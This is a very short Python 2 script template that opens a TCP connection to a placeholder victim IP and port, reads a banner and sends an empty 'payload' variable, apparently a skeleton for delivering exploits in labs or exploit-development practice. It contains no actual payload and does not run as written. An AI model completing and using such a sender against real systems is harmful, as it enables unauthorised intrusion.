import sys, socket

target = <victim IP>
port = <target port>

payload = 

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,port))

print s.recv(2048)
s.send(payload)
s.close()
